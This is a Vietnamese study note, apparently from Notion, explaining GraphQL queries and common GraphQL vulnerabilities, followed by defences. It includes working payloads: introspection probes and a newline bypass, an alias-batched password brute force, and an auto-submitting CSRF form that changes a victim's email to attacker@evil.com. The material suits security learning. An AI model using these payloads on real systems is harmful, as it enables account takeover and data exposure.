# GraphQL API

Source: https://www.notion.so/3454d37069a8800db701f94dfbedaa61

## Tổng Quan

GraphQL là API query language cho phép client chỉ định chính xác dữ liệu muốn lấy. Khác REST, GraphQL thường dùng một endpoint duy nhất, ví dụ `POST /graphql`.

Operation chính:

- Query: lấy dữ liệu.
- Mutation: thay đổi dữ liệu.
- Subscription: nhận dữ liệu real-time qua kết nối lâu dài.

Ví dụ schema:

```graphql
type Product {
  id: ID!
  name: String!
  description: String!
  price: Int
}
```

## Query, Mutation, Variables

Query:

```graphql
query myGetProductQuery {
  getProduct(id: 123) {
    name
    description
  }
}
```

Mutation:

```graphql
mutation {
  createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
    id
    name
    listed
  }
}
```

Variables:

```graphql
query getEmployeeWithVariable($id: ID!) {
  getEmployees(id: $id) {
    name {
      firstname
      lastname
    }
  }
}
```

## Lỗ Hổng Thường Gặp

### Finding GraphQL Endpoints

Probe phổ biến:

```graphql
query { __typename }
```

Endpoint hay gặp:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/v1`

### IDOR Qua Argument

Nếu resolver không check authorization, attacker có thể truy vấn object ẩn:

```graphql
query {
  product(id: 3) {
    id
    name
    listed
  }
}
```

### Introspection Exposure

Probe:

```json
{ "query": "{__schema{queryType{name}}}" }
```

Introspection bật ở production có thể leak toàn bộ schema, field ẩn, mutation admin hoặc deprecated field còn hoạt động.

### Bypass Introspection Defense

Regex block kém có thể bị bypass bằng newline hoặc đổi method:

```json
{
  "query": "query{__schema\n{queryType{name}}}"
}
```

### Suggestions Leak

Apollo có thể trả gợi ý `Did you mean ...`, giúp attacker enumerate schema dù introspection bị tắt. Tool: Clairvoyance.

### Rate Limit Bypass Bằng Aliases

Aliases cho phép nhét nhiều operation vào một HTTP request:

```graphql
mutation {
  bruteforce0: login(input:{username:"carlos", password:"123456"}) { token success }
  bruteforce1: login(input:{username:"carlos", password:"password"}) { token success }
  bruteforce2: login(input:{username:"carlos", password:"qwerty"}) { token success }
}
```

Nếu rate limiter chỉ đếm HTTP request, technique này có thể bypass.

### GraphQL CSRF

Nếu endpoint chấp nhận `application/x-www-form-urlencoded` hoặc `GET` cho mutation và session dùng cookie, có thể CSRF:

```html
<form action="https://vuln.site/graphql" method="POST" enctype="application/x-www-form-urlencoded">
  <input name="query" value='mutation{changeEmail(newEmail:"attacker@evil.com"){success}}'>
</form>
<script>document.forms[0].submit()</script>
```

## Phòng Chống

- Disable introspection ở production nếu API không public.
- Strip GraphQL suggestions.
- Field-level authorization ở resolver.
- Depth limit, alias limit, query cost analysis.
- Strict content type: chỉ nhận `application/json` cho POST.
- CSRF token và cookie `SameSite`.
- Persisted queries hoặc allowlist cho operation quan trọng.

